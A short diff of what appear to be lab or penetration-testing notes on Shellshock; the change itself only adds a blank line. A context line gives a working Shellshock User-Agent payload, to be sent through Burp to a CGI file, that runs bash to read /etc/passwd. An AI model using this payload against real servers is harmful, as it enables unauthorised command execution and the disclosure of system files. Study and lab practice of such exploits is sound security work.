@@ -9,5 +9,6 @@
  ￼
 - send a burp request to cgi file and modify user-agent as above:
 	- () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
+	
 	![http-exploit-burp](./images/http-02.png)
 	  ￼
